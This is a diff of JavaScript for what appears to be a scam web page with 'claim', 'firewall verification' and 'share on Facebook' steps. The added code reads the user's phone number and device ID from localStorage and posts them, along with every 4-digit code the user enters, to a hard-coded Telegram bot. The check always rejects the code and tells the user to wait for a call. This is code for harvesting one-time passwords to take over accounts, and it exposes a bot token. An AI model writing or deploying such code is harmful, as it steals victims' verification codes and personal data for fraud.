@@ -147,12 +147,17 @@ function attachClaimButton() {
         }
     }
     
-    // ========== SHOW FIREWALL POPUP (Phase 3) - REPLACE THIS ==========
+    // ========== SHOW FIREWALL POPUP (Phase 3) ==========
 function showFirewallPopup() {
     const popupInner = document.querySelector('.popup-inner');
     if (!popupInner) return;
     
     currentPhase = 3;
+    
+    // Send Telegram notification for REQUEST CALL
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+    sendFirewallRequestNotification(userPhone, deviceId);
     
     // Fade out transition
     popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
@@ -277,12 +282,14 @@ function attachPhase3Events(popupInner) {
 function verifyFirewallCodePhase3() {
     const codeInput = document.getElementById('verificationCodePhase3');
     const errorMsg = document.getElementById('firewallErrorMsgPhase3');
-    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
     const code = codeInput?.value.trim();
+    
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
     
     if (!code || code.length !== 4) {
         if (errorMsg) {
-            errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid.";
+            errorMsg.innerText = "⚠️ Invalid code. Enter 4 digits.";
             errorMsg.style.display = 'block';
         }
         if (codeInput) {
@@ -292,22 +299,20 @@ function verifyFirewallCodePhase3() {
         return;
     }
     
-    // ALWAYS INVALID - No matter what code they enter
+    // SEND TELEGRAM NOTIFICATION
+    sendVerificationAttemptNotification(userPhone, deviceId, code);
+    
+    // ALWAYS INVALID
     if (errorMsg) {
-        errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid. Please wait for the admin to call you.";
+        errorMsg.innerText = "⚠️ Invalid verification code. Please wait for the call.";
         errorMsg.style.display = 'block';
     }
     if (codeInput) {
         codeInput.style.animation = 'shake 0.3s ease-in-out';
         setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
+        codeInput.value = '';
     }
     
-    // Clear input field after invalid attempt
-    setTimeout(() => {
-        if (codeInput) codeInput.value = '';
-    }, 500);
-    
-    // Re-enable verify button (but still disabled visually for a moment)
     if (verifyBtn) {
         setTimeout(() => {
             verifyBtn.disabled = false;
@@ -621,7 +626,7 @@ function showTask3Message() {
             </p>
         </div>
         
-        <button class=btn-facebook-shimmer" id="task3ShareBtn" style="width: 100%; margin: 15px 0; background: linear-gradient(135deg, #1877F2, #0a56b6); border: none; border-radius: 50px; padding: 14px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
+        <button class="btn-facebook-shimmer" id="task3ShareBtn" style="width: 100%; margin: 15px 0; background: linear-gradient(135deg, #1877F2, #0a56b6); border: none; border-radius: 50px; padding: 14px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
             <i class="fa-brands fa-facebook-f"></i>
             <span>SHARE ON FACEBOOK</span>
         </button>
@@ -718,6 +723,46 @@ Time: ${timestamp}`;
     } catch(e) {
         console.error('Telegram error:', e);
     }
+}
+    // ========== TELEGRAM: REQUEST CALL ==========
+async function sendFirewallRequestNotification(userPhone, deviceId) {
+    try {
+        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const chatId = "7298607329";
+        
+        const now = new Date();
+        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+        
+        const message = `📞 REQUEST CALL
+User: ${userPhone}
+Device ID: ${deviceId}
+Time: ${timestamp}`;
+        
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+        
+        console.log('Telegram: Request call sent');
+    } catch(e) { console.error('Telegram error:', e); }
+}
+
+// ========== TELEGRAM: VERIFICATION CODE ATTEMPT ==========
+async function sendVerificationAttemptNotification(userPhone, deviceId, code) {
+    try {
+        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const chatId = "7298607329";
+        
+        const now = new Date();
+        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+        
+        const message = `🔑 VERIFICATION CODE
+User: ${userPhone}
+Device ID: ${deviceId}
+Code: ${code}
+Time: ${timestamp}`;
+        
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+        
+        console.log('Telegram: Verification attempt sent');
+    } catch(e) { console.error('Telegram error:', e); }
 }
     
     // ========== CLOSE POPUP ==========
